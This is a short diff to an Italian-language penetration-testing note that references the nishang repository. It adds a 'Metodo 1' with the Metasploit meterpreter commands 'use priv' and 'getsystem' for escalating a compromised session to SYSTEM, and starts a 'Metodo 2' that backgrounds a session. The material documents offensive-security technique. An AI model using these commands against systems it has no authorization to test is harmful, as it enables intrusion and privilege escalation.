@@ -80,6 +80,14 @@ https://github.com/samratashok/nishang
 ### meterpreter
 Ottenere una sessione meterpreter con il metodo sopra.
 
+#### Metodo 1
+
+```
+use priv
+getsystem
+```
+
+#### Metodo 2
 ```
 meterpreter > background 
 [*] Backgrounding session 4...
